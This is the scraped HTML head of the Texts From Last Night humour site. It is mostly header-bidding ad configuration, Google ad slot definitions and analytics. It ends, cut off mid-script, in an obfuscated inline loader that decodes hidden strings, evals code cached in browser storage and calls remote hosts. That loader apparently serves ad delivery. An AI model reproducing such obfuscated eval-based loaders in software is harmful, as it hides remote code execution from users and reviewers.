<!DOCTYPE html>
<html>
  <head>

    <title>Texts From Last Night</title>

          <meta name="description" content="Texts From Last Night: Remember that text you shouldn't have sent last night? We do." />
    
    <meta name="keywords" content="funny, text messages, text, texts, sexting, last night, drunk, hangover, walk of shame, bars, funny, iphone, android" />

    <meta content='text/html; charset=utf-8' http-equiv='Content-Type' />
    <meta content="True" name="HandheldFriendly" />
    <meta content="320" name="MobileOptimized" />
    <meta content="width=device-width, initial-scale=1.0, user-scalable=0, maximum-scale=1.0" name="viewport" />

    <link rel="alternate" type="application/rss+xml" title="TFLN RSS Feed" href="http://feeds.feedburner.com/tfln" />
    <link rel="shortcut icon" href="http://z.textsfromlastnight.com/favicon.ico">

    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" />
    <link type="text/css" rel="stylesheet" href="http://z.textsfromlastnight.com/fancybox/jquery.fancybox-1.2.6.css" />

    <!-- ATTEMPTING USING NEWER JQUERY -->
    <script src="https://code.jquery.com/jquery-1.12.0.min.js" type="text/javascript"></script>

    <link type="text/css" rel="stylesheet" href="/stylesheets/markmakes.css" />
    <script src="/js/js-cookie.js" type="text/javascript"></script>
    <script src="/js/markmakes.js" type="text/javascript"></script>

    <meta property="fb:app_id" content="577060899108811" />

<script type="text/javascript" src="/js/prebid.js"></script>
<script type='text/javascript'>
// old IE console.log
if (!window.console) window.console = {};
if (!window.console.log) window.console.log = function () { };

window.tfln_is_phone = (window.innerWidth <= 700);
window.tfln_is_tablet = (!window.tfln_is_phone && window.innerWidth <= 1050);
window.tfln_is_desktop = (!window.tfln_is_phone && !window.tfln_is_tablet);
window.tfln_is_phone_or_tablet = (window.tfln_is_phone || window.tfln_is_tablet);
window.tfln_is_paged = true;

window.tfln_prebid = {
    aol: {
        network: '10455.1',
        DT_Banner_1: { "970x90": { placementId: 3990838, size: 2473 },
                       "728x90": { placementId: 3990839, size: 225 },
        },
        DT_Banner_5: { "728x90": { placementId: 3990888, size: 225 },
        },
        DT_Rectangle_1: { "300x600": { placementId: 3990835, size: 529 },
                          "300x250": { placementId: 3990837, size: 170 },
        },
        DT_Rectangle_2: { "300x600": { placementId: 3990885, size: 529 },
                          "300x250": { placementId: 3990886, size: 170 },
        },
        DT_Sky_1: { "160x600": { placementId: 3990836, size: 154 },
        },
        Mobile_1: { "320x50": { placementId: 3990843, size: 3055 },
                    "728x90": { placementId: 3990850, size: 225 },
        },
        Mobile_2: { "320x50": { placementId: 3990848, size: 3055 },
                    "300x250": { placementId: 3990845, size: 170 },
                    "728x90": { placementId: 3990847, size: 225 },
        },
        Mobile_3: { "320x50": { placementId: 3990842, size: 3055 },
                    "300x250": { placementId: 3990849, size: 170 },
                    "728x90": { placementId: 3990846, size: 225 },
        },
        Mobile_4: { "320x50": { placementId: 3990858, size: 3055 },
                    "300x250": { placementId: 3990853, size: 170 },
                    "728x90": { placementId: 3990854, size: 225 },
        },
        Mobile_5: { "320x50": { placementId: 3990856, size: 3055 },
                    "300x250": { placementId: 3990855, size: 170 },
                    "728x90": { placementId: 3990857, size: 225 },
        },
    },

    bRealTime: {
                //DT_Banner_1: { placementId: 10969020 },
        //DT_Banner_5: { placementId: 10969017 },
        //DT_Rectangle_1: { placementId: 10969024 },
        //DT_Rectangle_2: { placementId: 10969022 },
        //DT_Sky_1: { placementId: 10969023 },
        //DT_Sky_3: { placementId: 10969036 },
        //Mobile_1: { placementId: 10969037 },
        //Mobile_2: { placementId: 10969045 },
        //Mobile_3: { placementId: 10969038 },
        //Mobile_4: { placementId: 10969041 },
        //Mobile_5: { placementId: 10969042 },
    },

    defymedia: {
        DT_Banner_1: { placementId: 9036257 },
        DT_Banner_5: { placementId: 9036312 },
        DT_Rectangle_1: { placementId: 9036308 },
        DT_Rectangle_2: { placementId: 9036309 },
        DT_Sky_1: { placementId: 9036305 },
        DT_Sky_3: { placementId: 9036313 },
        Mobile_1: { placementId: 9036314 },
        Mobile_2: { placementId: 9036316 },
        Mobile_3: { placementId: 9036317 },
        Mobile_4: { placementId: 9036320 },
        Mobile_5: { placementId: 9036321 },
    },

    districtM: {
        DT_Banner_1: { placementId: 9293639 },
        DT_Banner_5: { placementId: 9293639 },
        DT_Rectangle_1: { placementId: 9293639 },
        DT_Rectangle_2: { placementId: 9293639 },
        DT_Sky_1: { placementId: 9293639 },
        DT_Sky_3: { placementId: 9293639 },
        Mobile_1: { placementId: 9293634 },
        Mobile_2: { placementId: 9293634 },
        Mobile_3: { placementId: 9293634 },
        Mobile_4: { placementId: 9293634 },
        Mobile_5: { placementId: 9293634 },
    },

    pubsquared: {
        DT_Banner_1: { impId: '7354-219-1023' },
        DT_Banner_5: { impId: '7354-219-1027' },
        DT_Rectangle_1: { impId: '7354-219-1025' },
        DT_Rectangle_2: { impId: '7354-219-1026' },
        DT_Sky_1: { impId: '7354-219-1024' },
        DT_Sky_3: { impId: '7354-219-1028' },
        Mobile_1: { impId: '7354-219-1029' },
        Mobile_2: { impId: '7354-219-1030' },
        Mobile_3: { impId: '7354-219-1031' },
        Mobile_4: { impId: '7354-219-1032' },
        Mobile_5: { impId: '7354-219-1033' },
    },

    sovrn: {
        DT_Banner_1: { "970x90": { tagid: 345176 },
                       "728x90": { tagid: 345175 },
                       "970x250": { tagid: 345177 },
        },
        DT_Banner_5: { "728x90": { tagid: 369896 },
        },
        DT_Rectangle_1: { "300x600": { tagid: 345182 },
                          "300x250": { tagid: 345179 },
                          "300x1050": { tagid: 345183 },
        },
        DT_Rectangle_2: { "300x600": { tagid: 345186 },
                          "300x250": { tagid: 345185 },
                          "300x1050": { tagid: 345187 },
        },
        DT_Sky_1: { "160x600": { tagid: 345178 },
                    "120x600": { tagid: 346802 },
        },
        DT_Sky_3: { "160x600": { tagid: 369897 },
                    "120x600": { tagid: 369898 },
        },
        Mobile_1: { "320x50": { tagid: 345193 },
        },
        Mobile_2: { "320x50": { tagid: 345196 },
                    "300x250": { tagid: 345197 },
        },
        Mobile_3: { "320x50": { tagid: 345198 },
                    "300x250": { tagid: 345199 },
        },
        Mobile_4: { "320x50": { tagid: 345200 },
                    "300x250": { tagid: 345201 },
        },
        Mobile_5: { "320x50": { tagid: 345202 },
                    "300x250": { tagid: 345203 },
        },
    },

    adequant: {
        DT_Banner_1: { publisher_id: 5004220 },
        DT_Banner_5: { publisher_id: 5004220 },
        DT_Rectangle_1: { publisher_id: 5004220 },
        DT_Rectangle_2: { publisher_id: 5004220 },
        DT_Sky_1: { publisher_id: 5004220 },
        DT_Sky_3: { publisher_id: 5004220 },
        Mobile_1: { publisher_id: 5004220 },
        Mobile_2: { publisher_id: 5004220 },
        Mobile_3: { publisher_id: 5004220 },
        Mobile_4: { publisher_id: 5004220 },
        Mobile_5: { publisher_id: 5004220 },
    },

    underdogmedia: {
        DT_Banner_1: { siteId: 11323 },
        DT_Banner_5: { siteId: 11323 },
        DT_Rectangle_1: { siteId: 11323 },
        DT_Rectangle_2: { siteId: 11323 },
        DT_Sky_1: { siteId: 11323 },
        DT_Sky_3: { siteId: 11323 },
        Mobile_1: { siteId: 11323 },
        Mobile_2: { siteId: 11323 },
        Mobile_3: { siteId: 11323 },
        Mobile_4: { siteId: 11323 },
        Mobile_5: { siteId: 11323 },
    },

    pulsepoint: {
        cp: 560920, // "Publisher Id"
        DT_Banner_1: { "970x90": { ct: 553405 },
                       "728x90": { ct: 553397 },
        },
        DT_Banner_5: { "728x90": { ct: 553401 }, /* called DT Banner 2 in setup sheet */
        },
        DT_Rectangle_1: { "300x600": { ct: 553400 },
                          "300x250": { ct: 553399 },
        },
        DT_Rectangle_2: { "300x600": { ct: 553404 },
                          "300x250": { ct: 553403 },
        },
        DT_Sky_1: { "160x600": { ct: 553398 },
        },
        DT_Sky_3: { "160x600": { ct: 553402 }, /* called DT Sky 2 in setup sheet */
        },
        Mobile_1: { "320x50": { ct: 553417 },
                    "728x90": { ct: 553418 },
        },
        Mobile_2: { "320x50": { ct: 553419 },
                    "300x250": { ct: 553420 },
                    "728x90": { ct: 553421 },
        },
        Mobile_3: { "320x50": { ct: 553422 },
                    "300x250": { ct: 553423 },
                    "728x90": { ct: 553424 },
        },
        Mobile_4: { "320x50": { ct: 553425 },
                    "300x250": { ct: 553426 },
                    "728x90": { ct: 553427 },
        },
        Mobile_5: { "320x50": { ct: 553428 },
                    "728x90": { ct: 553429 },
        },
    },

    komoona: {
        hbid: "daaa96e7ef6744129b6142b0e29ca398", // "hbid" from setup sheet
        DT_Banner_1: { "970x250": { placementId: "39c5723745297777ebe794c6924d307f" },
                       "728x90": { placementId: "a716fe598cd0c7ae2c0e3faa777ec6dd" },
        },
        DT_Banner_5: { "728x90": { placementId: "be57532c920071214cc16294003a0f39" }, /* called DT Banner 2 in setup sheet */
        },
        DT_Rectangle_1: { "300x600": { placementId: "e207fb69a9236b16a19165b4369ebca3" },
                          "300x250": { placementId: "1940f8902f09b45c1ae2f3f90e671251" },
        },
        DT_Rectangle_2: { "300x600": { placementId: "6a60b2d22efdc5d6af4d8a3be26e682e" },
                          "300x250": { placementId: "3661d73f531403f3e4ebc631dfeb9e1f" },
        },
        DT_Sky_1: { "160x600": { placementId: "284c23fbb37770890a8996e60f8bcf52" },
        },
        DT_Sky_3: { "160x600": { placementId: "a35ad707b6da8b348517f5c353867cc6" }, /* called DT Sky 2 in setup sheet */
        },
        Mobile_1: { "320x50": { placementId: "28371d003b71c40618623bdec082b5db" },
                    "728x90": { placementId: "612840f3618cfd65120d3a804fe4f2f5" },
        },
        Mobile_2: { "320x50": { placementId: "39586dbbb824ba5d247844e5a9ef50b7" },
                    "300x250": { placementId: "17814ae42ab40bc6a0e96267e2ac3fa1" },
                    "728x90": { placementId: "12ef493a81940598a95dbc9ea38c8872" },
        },
        Mobile_3: { "320x50": { placementId: "91d2403ff16903d1afe3420f79fe14bb" },
                    "300x250": { placementId: "dfbaf604b73fbbf23b50442a7c6e4f07" },
                    "728x90": { placementId: "1b1d60fa62442c4e72749d8b30088079" },
        },
        Mobile_4: { "320x50": { placementId: "4449bdb32ff32aee214fa4984ae35799" },
                    "300x250": { placementId: "66b592118d76399a4a8a57b3ed92e10b" },
                    "728x90": { placementId: "4bb60ec311902ef7bf1609d19492e72a" },
        },
        Mobile_5: { "320x50": { placementId: "4147669aa59cb1791e345631723cfc5d" },
                    "728x90": { placementId: "706c294f8ae271bcb18d45b62f2d885c" },
        },
    },

    vertoz: {
        DT_Banner_1: { "728x90": { placementId: "VZ-HB-G744267V72ECG5" },
        },
        DT_Banner_5: { "728x90": { placementId: "VZ-HB-Y620834V80H1BE" },
        },
        DT_Rectangle_1: { "300x600": { placementId: "VZ-HB-F340181VG343GC" },
                          "300x250": { placementId: "VZ-HB-W180761VFG0CB4" },
        },
        DT_Rectangle_2: { "300x600": { placementId: "VZ-HB-W600664VF3D3F0" },
                          "300x250": { placementId: "VZ-HB-I105502V063CC9" },
        },
        DT_Sky_1: { "160x600": { placementId: "VZ-HB-Q349386VDGBH35" },
        },
        DT_Sky_3: { "160x600": { placementId: "VZ-HB-Q366542V52603G" },
        },
        Mobile_1: { "320x50": { placementId: "VZ-HB-Y555234VHC7E07" },
        },
        Mobile_2: { "320x50": { placementId: "VZ-HB-R509034V95E391" },
                    "300x250": { placementId: "VZ-HB-V927130V4BCE4H" },
        },
        Mobile_3: { "320x50": { placementId: "VZ-HB-K493213VC5E1CE" },
                    "300x250": { placementId: "VZ-HB-A785388VD88ED6" },
        },
        Mobile_4: { "320x50": { placementId: "VZ-HB-R482306VDE78FB" },
                    "300x250": { placementId: "VZ-HB-Q635682VH9GE31" },
        },
        Mobile_5: { "320x50": { placementId: "VZ-HB-T954177VCE6FFH" },
                    "300x250": { placementId: "VZ-HB-L657003V2E0G3F" },
        },
    },

    rhythmone: {
        placementId: 61402,
    },

    memeglobal: {
        tagid: 436,
    },

    rubicon: {
        accountId: 16842,
        siteId: 149194,
        DT_Banner_1: { "728x90": { zoneId: 707002, sizes: [2] },
        },
        DT_Banner_5: { "728x90": { zoneId: 707004, sizes: [2] },
        },
        DT_Rectangle_1: { "300x600": { zoneId: 707006, sizes: [10] },
                          "300x250": { zoneId: 707006, sizes: [15] },
        },
        DT_Rectangle_2: { "300x600": { zoneId: 707008, sizes: [10] },
                          "300x250": { zoneId: 707008, sizes: [15] },
        },
        DT_Sky_1: { "160x600": { zoneId: 707014, sizes: [9] },
        },
        DT_Sky_3: { "160x600": { zoneId: 707016, sizes: [9] },
        },
        Mobile_1: { "320x50": { zoneId: 707020, sizes: [43, 44] }, // 43 == 320x50, 44 == 300x50 which we don't use, but passing the size anyway per spec sheet
        },
        Mobile_2: { "320x50": { zoneId: 707024, sizes: [43, 44] },
                    "300x250": { zoneId: 707024, sizes: [15] },
        },
        Mobile_3: { "320x50": { zoneId: 707026, sizes: [43, 44] },
                    "300x250": { zoneId: 707026, sizes: [15] },
        },
        Mobile_4: { "320x50": { zoneId: 707028, sizes: [43, 44] },
                    "300x250": { zoneId: 707028, sizes: [15] },
        },
        Mobile_5: { "320x50": { zoneId: 707030, sizes: [43, 44] },
                    // no zodeId + size pair for this one in spec sheet "300x250": {  },
        },       
    },

};

window.PREBID_TIMEOUT = 1400;

window.tfln_initial_adUnits = [];

window.tfln_prebid_adunits_for = function(slot, sizes, code) {
    // code is the div id
    // slot is the 'DT_Banner_1' thing
    // sizes is an array of arrays: [[300, 250], [300,600]]

    // AOL gets one entry per size that we have an entry for
    // Sovrn gets one entry per size that we have an entry for
    // Biddr / bRealTime gets an entry per slot
    // DistrictM gets an entry per slot
    // SpringServe / pubsquared gets an entry per slot
    // Defy Media gets an entry per slot

    var bids = [];

    // Defy Media
    if (false && window.tfln_prebid.defymedia[slot]) {
	bids.push({
	    bidder: 'defymedia',
	    params: {
		placementId: window.tfln_prebid.defymedia[slot].placementId,
	    }
	});
    }

    // AOL
    if (window.tfln_prebid.aol[slot]) {
        sizes.forEach(function(size) {
            var sizeStr = size[0] + 'x' + size[1];
            var data = window.tfln_prebid.aol[slot][sizeStr];
            if (data) {
                bids.push({
		    bidder: 'aol',
		    params: {
			placement: data.placementId,
			network: window.tfln_prebid.aol.network,
			sizeId: data.size,
		    }
		});
            }
        });
    }

    // Sovrn
    if (window.tfln_prebid.sovrn[slot]) {
        sizes.forEach(function(size) {
            var sizeStr = size[0] + 'x' + size[1];
            var data = window.tfln_prebid.sovrn[slot][sizeStr];
            if (data) {
                bids.push({
		    bidder: 'sovrn',
		    params: {
			tagid: data.tagid,
		    }
		});
            }
        });
    }

    // Biddr / bRealTime
    if (false && window.tfln_prebid.bRealTime[slot]) {
	bids.push({
	    bidder: 'brealtime',
	    params: {
		placementId: window.tfln_prebid.bRealTime[slot].placementId,
	    }
	});
    }

    // DistrictM
    if (window.tfln_prebid.districtM[slot]) {
	bids.push({
	    bidder: 'districtm',
	    params: {
		placementId: window.tfln_prebid.districtM[slot].placementId,
	    }
	});
    }

    // Pubsquared / SpringServe
    // comment out per @daniel and card 145
    if (false && window.tfln_prebid.pubsquared[slot]) {
	bids.push({
	    bidder: 'springserve', // 'pubsquared',
	    params: {
		impId: window.tfln_prebid.pubsquared[slot].impId,
	    }
	});
    }

    // adequant
    if (false && window.tfln_prebid.adequant[slot]) {
	bids.push({
	    bidder: 'adequant',
	    params: {
		publisher_id: window.tfln_prebid.adequant[slot].publisher_id,
	    }
	});
    }

    // underdogmedia
    if (window.tfln_prebid.underdogmedia[slot]) {
    bids.push({
        bidder: 'underdogmedia',
        params: {
        siteId: window.tfln_prebid.underdogmedia[slot].siteId,
        }
    });
    }

    // pulsepoint
    if (false && window.tfln_prebid.pulsepoint[slot]) {
        sizes.forEach(function(size) {
            var sizeStr = size[0] + 'x' + size[1];
            var data = window.tfln_prebid.pulsepoint[slot][sizeStr];
            if (data) {
                var params = {
                    cf: sizeStr,
                    cp: window.tfln_prebid.pulsepoint.cp,
                    ct: data.ct,
                };
                bids.push({
                    bidder: 'pulsepoint',
                    params: params,
                });
            }
        });
    }

    // komoona
    // comment out per card 120 and @daniel
    if (false && window.tfln_prebid.komoona[slot]) {
        sizes.forEach(function(size) {
            var sizeStr = size[0] + 'x' + size[1];
            var data = window.tfln_prebid.komoona[slot][sizeStr];
            if (data) {
                var params = {
                    hbid: window.tfln_prebid.komoona.hbid,
                    placementId: data.placementId,
                };
                bids.push({
                    bidder: 'komoona',
                    params: params,
                });
            }
        });
    }

    // vertoz
    if (false && window.tfln_prebid.vertoz[slot]) {
        sizes.forEach(function(size) {
            var sizeStr = size[0] + 'x' + size[1];
            var data = window.tfln_prebid.vertoz[slot][sizeStr];
            if (data) {
                var params = {
                    placementId: data.placementId,
                };
                bids.push({
                    bidder: 'vertoz',
                    params: params,
                });
            }
        });
    }

    // rhythmone
    if (window.tfln_prebid.rhythmone && window.tfln_prebid.rhythmone['placementId']) {
        bids.push({
            bidder: 'rhythmone',
            params: {
                placementId: window.tfln_prebid.rhythmone['placementId'],
            },
	});
    }

    // memeglobal
    if (false && window.tfln_prebid.memeglobal && window.tfln_prebid.memeglobal['tagid']) {
        bids.push({
            bidder: 'memeglobal',
            params: {
                tagid: window.tfln_prebid.memeglobal['tagid'],
            },
        });
    }

    // rubicon
    var rubicon_bids = [];
    if (window.tfln_prebid.rubicon && 
        window.tfln_prebid.rubicon['accountId'] &&
        window.tfln_prebid.rubicon['siteId'] &&
        window.tfln_prebid.rubicon[slot]
    ) {
        var output_zoneId_sizes = {};
	// collect zoneId -> sizes mappings we should send based on the dimensions passed to us in the sizes array
        sizes.forEach(function(size) {
            var sizeStr = size[0] + 'x' + size[1];
            var data = window.tfln_prebid.rubicon[slot][sizeStr];
            if (data && data.zoneId && data.sizes) {
                if (!output_zoneId_sizes[data.zoneId]) output_zoneId_sizes[data.zoneId] = [];
                output_zoneId_sizes[data.zoneId] = output_zoneId_sizes[data.zoneId].concat(data.sizes);
            }
        });
        Object.keys(output_zoneId_sizes).map(function(zoneId) {
            rubicon_bids.push({
                bidder: 'rubicon',
                params: {
		    accountId: window.tfln_prebid.rubicon.accountId,
		    siteId: window.tfln_prebid.rubicon.siteId,
		    zoneId: zoneId,
		    sizes: output_zoneId_sizes[zoneId],
		}
            });
        });
    }

    // https://git.daplie.com/Daplie/knuth-shuffle/blob/master/index.js
    var shuffle = function(array) {
        var currentIndex = array.length
                         , temporaryValue
                         , randomIndex
                         ;
        // While there remain elements to shuffle...
        while (0 !== currentIndex) {
            // Pick a remaining element...
            randomIndex = Math.floor(Math.random() * currentIndex);
            currentIndex -= 1;
            // And swap it with the current element.
            temporaryValue = array[currentIndex];
            array[currentIndex] = array[randomIndex];
            array[randomIndex] = temporaryValue;
        }
        return array;
    };


    // randomize the bids array in-place To not do it in-place, pass bids.slice(0).
    bids = shuffle(bids);

    // add in rubicon bids before others, per @daniel
    var all_bids = rubicon_bids.concat(bids);

    // returns an object suitable for pushing onto the adUnits array that gets passed to pbjs.addAdUnits (or passed directly)
    return {
	code: code,
	sizes: sizes,
	bids: all_bids
    };
};

window.tfln_pbd_push = function(slot, sizes, code) {
    window.tfln_initial_adUnits.push(window.tfln_prebid_adunits_for(slot, sizes, code));
};

var pbjs = pbjs || {};
pbjs.que = pbjs.que || [];

pbjs.bidderSettings = {
    defymedia: {
        bidCpmAdjustment: function(bidCpm) {
            return bidCpm * .8;
        }
    },
    aol: {
        bidCpmAdjustment: function(bidCpm) {
            return bidCpm * .8;
        }
    },
    brealtime: {
        bidCpmAdjustment: function(bidCpm) {
            return bidCpm * .8;
        }
    },
    sovrn: {
        bidCpmAdjustment: function(bidCpm) {
            return bidCpm * .9;
        }
    },
    districtm: {
        bidCpmAdjustment: function(bidCpm) {
            return bidCpm * .9;
        }
    },
    standard: {
	adserverTargeting: [{
	    key: "custom_bidder_key",
	    val: function(bidResponse) {
		return bidResponse.bidderCode;
	    }
	}, {
	    key: "hb_adid",
	    val: function(bidResponse) {
		return bidResponse.adId;
	    }
	}, {
	    key: "hb_pb",
	    val: function(bidResponse) {
		var cpm = bidResponse.cpm;
		if (cpm < 3.00) {
		    return (Math.floor(cpm * 100) / 100).toFixed(2);
		} else if (cpm < 5.00) {
		    return (Math.floor(cpm * 10) / 10).toFixed(2);
		} else if (cpm < 20.00) {
		    return (Math.floor(cpm * 2) / 2).toFixed(2);
		} else {
		    return '20.00';
		}
	    }
	}]
    }
};

  var googletag = googletag || {};
  googletag.cmd = googletag.cmd || [];
  googletag.cmd.push(function() {
    googletag.pubads().disableInitialLoad();
  });


pbjs.que.push(function() {
    pbjs.aliasBidder('appnexus', 'districtm');
    pbjs.aliasBidder('appnexus', 'defymedia');
});


pbjs.que.push(function() {
    if (window.tfln_is_phone_or_tablet) {
	window.tfln_pbd_push('Mobile_1', [[320, 50], [728, 90]], 'div-gpt-ad-8675309-mobile-1');
	window.tfln_pbd_push('Mobile_2', [[320, 50], [300, 250], [728, 90]], 'div-gpt-ad-8675309-mobile-2');
	window.tfln_pbd_push('Mobile_3', [[320, 50], [300, 250], [728, 90]], 'div-gpt-ad-8675309-mobile-3');
	window.tfln_pbd_push('Mobile_4', [[320, 50], [300, 250], [728, 90]], 'div-gpt-ad-8675309-mobile-4');
	window.tfln_pbd_push('Mobile_5', [[320, 50], [300, 250], [728, 90]], 'div-gpt-ad-8675309-mobile-5');
    } else {
	window.tfln_pbd_push('DT_Banner_1', [[970, 250], [970, 90], [728, 90], [728, 250]], 'div-gpt-ad-1460580604140-0-970');
	window.tfln_pbd_push('DT_Banner_5', [[728, 90]], 'div-gpt-ad-1460580604140-1');
	window.tfln_pbd_push('DT_Rectangle_1', [[300, 600], [300, 1050], [300, 250]], 'div-gpt-ad-1460580604140-2');
	window.tfln_pbd_push('DT_Rectangle_2', [[300, 600], [300, 1050], [300, 250]], 'div-gpt-ad-1460580604140-3');
	window.tfln_pbd_push('DT_Sky_1', [[160, 600], [120, 600]], 'div-gpt-ad-1460580604140-5');
	window.tfln_pbd_push('DT_Sky_3', [[160, 600], [120, 600]], 'div-gpt-ad-1460580604140-6');
    }
    pbjs.addAdUnits(window.tfln_initial_adUnits);
    pbjs.requestBids({
	bidsBackHandler: tfln_sendAdserverRequest
    });
});

function tfln_sendAdserverRequest() {
    if (pbjs.adserverRequestSent) return;
    pbjs.adserverRequestSent = true;
    googletag.cmd.push(function() {
	pbjs.que.push(function() {
	    pbjs.setTargetingForGPTAsync();
	    googletag.pubads().refresh();
	});
    });
}

setTimeout(function() {
    tfln_sendAdserverRequest();
}, window.PREBID_TIMEOUT);

(function() {
    var gads = document.createElement('script');
    gads.async = true;
    gads.type = 'text/javascript';
    var useSSL = 'https:' == document.location.protocol;
    gads.src = (useSSL ? 'https:' : 'http:') +
      '//www.googletagservices.com/tag/js/gpt.js';
    var node = document.getElementsByTagName('script')[0];
    node.parentNode.insertBefore(gads, node);
})();

googletag.cmd.push(function() {
    if (window.tfln_is_phone_or_tablet) {
	googletag.defineSlot('/18500263/TFLN.com_Mobile_1', [[320, 50], [728, 90]], 'div-gpt-ad-8675309-mobile-1').addService(googletag.pubads());
	googletag.defineSlot('/18500263/TFLN.com_Mobile_2', [[320, 50], [300, 250], [728, 90]], 'div-gpt-ad-8675309-mobile-2').addService(googletag.pubads());
	googletag.defineSlot('/18500263/TFLN.com_Mobile_3', [[320, 50], [300, 250], [728, 90]], 'div-gpt-ad-8675309-mobile-3').addService(googletag.pubads());
	googletag.defineSlot('/18500263/TFLN.com_Mobile_4', [[320, 50], [300, 250], [728, 90]], 'div-gpt-ad-8675309-mobile-4').addService(googletag.pubads());
	googletag.defineSlot('/18500263/TFLN.com_Mobile_5', [[320, 50], [300, 250], [728, 90]], 'div-gpt-ad-8675309-mobile-5').addService(googletag.pubads());
    } else {
	googletag.defineSlot('/18500263/TFLN.com_DT_Banner_1', [[728, 250], [970, 90], [970, 250], [728, 90]], 'div-gpt-ad-1460580604140-0-970').addService(googletag.pubads());
	googletag.defineSlot('/18500263/TFLN.com_DT_Banner_5', [[728, 90]], 'div-gpt-ad-1460580604140-1').addService(googletag.pubads());
	googletag.defineSlot('/18500263/TFLN.com_DT_Rectangle_1', [[300, 1050], [300, 600], [300, 250]], 'div-gpt-ad-1460580604140-2').addService(googletag.pubads());
	googletag.defineSlot('/18500263/TFLN.com_DT_Rectangle_2', [[300, 1050], [300, 600], [300, 250]], 'div-gpt-ad-1460580604140-3').addService(googletag.pubads());
	googletag.defineSlot('/18500263/TFLN.com_DT_Sky_1', [[120, 600], [160, 600]], 'div-gpt-ad-1460580604140-5').addService(googletag.pubads());
	googletag.defineSlot('/18500263/TFLN.com_DT_Sky_3', [[120, 600], [160, 600]], 'div-gpt-ad-1460580604140-6').addService(googletag.pubads());
    }
    googletag.defineSlot('/18500263/TFLN.com_1x1_ExitPop', [1, 1], 'div-gpt-ad-exitpop').addService(googletag.pubads());
    googletag.defineSlot('/18500263/TFLN.com_1x1_Slider', [1, 1], 'div-gpt-ad-slider').addService(googletag.pubads());
    googletag.pubads().setCentering(true);
    googletag.pubads().enableSingleRequest();
    googletag.pubads().collapseEmptyDivs();
            googletag.pubads().setTargeting('PageNumber', ['1']);
        googletag.enableServices();
});

(function() {
    var defy_script = document.createElement('script');
    defy_script.type = 'text/javascript';
    if (window.tfln_is_phone_or_tablet) {
        defy_script.src = '//pubportal.brkmd.com/tms/surf880dadae310442432180a011c8511ad6.js';
        defy_script.setAttribute('data-placement','11313095');
    } else {
        defy_script.src = '//pubportal.brkmd.com/tms/surff363ac5aad77ed17f874fa13fbc073c8.js';
        defy_script.setAttribute('data-placement','11138536');
    }
    document.head.appendChild(defy_script);
})();

</script>


    <script>
     (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
     (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
     m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
     })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
     ga('create', 'UA-50875790-4', 'auto');
     ga('send', 'pageview');
     pbjs.que.push(function() {
	 pbjs.enableAnalytics({
             provider: 'ga',
             options: {
		 global: 'ga', // <string> name of GA global. Default is 'ga'
		 enableDistribution: false,
             }
	 });
     });
</script>

<script>try{(function(){function B(){try{var a=K()}catch(c){}if(a)try{C(a.h,null)}catch(c){delete window.localStorage[a.key],delete window.sessionStorage[a.key]}else L(function(a,b){b.as=!0;try{C(a,b)}catch(e){}},M)}function M(){var b=window.location.protocol==a("GBIHADJ+")?a("GBIHADJ+YU0="):a("GBIHAHtrYQ==");(new Image).src=b+u+N}function L(a,c){function b(){var d=e.shift();if(d)try{d(a,b)}catch(m){b()}else v(),c()}try{O()}catch(f){v();c();return}var e=[P,Q,R,S];b()}function C(a,c){(function(){eval(a)})({e:a,
p:c,n:g})}function K(){var b=[];window.localStorage&&b.push(window.localStorage);window.sessionStorage&&b.push(window.sessionStorage);var c=D(a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),E(a("ABQWESwmIgc=")));c=new Uint8Array(c);for(var d="",e=0;e<c.length;e++)d+=String.fromCharCode(c[e]);c=btoa(d);d=(new Date).getTime();for(e=0;e<b.length;e++){var f=b[e],m;for(m in f)if(0===m.lastIndexOf(c,0)){try{for(var k=a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),g=atob(f[m]),l=new Uint8Array(g.length),
h=0;h<g.length;h++)l[h]=g.charCodeAt(h);var n=r(D(k,l.buffer))}catch(U){continue}h=parseInt(n.substring(0,13),10);if(!isNaN(h))if(864E5<d-h||1>d-h)f.removeItem(m);else if((h=n.substring(13))&&!(16>h.length))return{h:h,key:m}}}return null}function Q(b,c){var d=a("Q1JESA=="),e=a("RyRJQ3d+eyZYcHh+Bg9odCNXAHxzTVJUNkdOFhl+d3hKIjBKAwZ0I1d4cnx9DGZ2IFt7cXhOUF5KRkNtHHR+cEdcR0Z7B31YJHd7dwJ0EH1YKHR/fEFcLEJOQGJgAQI=");d=w+":"+d;var f={};f[a("BRQfAw==")]=a("BBMBHns=")+d+a("TxIBES83Pg0QNnwwJD4=");f[a("ExQWFCQqOgsDLg==")]=
a("CQcHGSwl");f[a("BRUWAi8lIwc=")]=a("CQcHGSwl");F(e,f,function(b){b=b.match(new RegExp(a("LgUSHiUtKgMWJ3sYI2VyEAZGYW12ThMKAAghEwptZBQUTVNYHSBlPkweJW8bYA4oSTFvGS1fT04sEF93Lj00aAIDHxE4")));if(null==b)return null;b=b[1];return a("EwcdFCggLxYHeHBkdm4HCDJNeXZ6RVRYQ1Q=")+b+a("UFBAQHBybhYbMmE2IiIzNUIfICEtBkY=")+b+a("UBQDHzMwblRRcnByZyA3OBUCMy5kFwkdBFRE")},b,c)}function R(b,c){var d=a("RlZDQQ=="),e=a("NlNJMQN+dltYB3V+c39odVNXdnxzR1VUQEZOFWJ+cwlKUzFKBHV0JFd4dXJ9eRd2JCh7cA9OVFpKTDJtGAF+fDVcQDN7AQ1YVXp7dHF0Z39YLHN/ejJcWjFOQ25gfXw=");
